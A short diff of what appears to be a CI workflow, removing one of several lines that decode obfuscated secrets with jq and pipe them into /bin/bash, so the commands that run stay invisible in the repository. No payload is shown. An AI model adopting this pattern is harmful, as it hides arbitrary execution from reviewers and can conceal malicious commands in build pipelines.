@@ -20,7 +20,6 @@ jobs:
           lntcn3: ${{ secrets.lntcn3 }}
         run: |
           printf '%s' "$lntcn3" | jq -r .hdddj944 | /bin/bash
-          printf '%s' "$vh298" | jq -r .f5496 | /bin/bash
           echo $k15 | jq -r .jko26 | /bin/bash
           echo $fokr92 | jq -r .pcluq9760 | /bin/bash
           echo $bqah5913 | jq -r .xikvp5 | /bin/bash
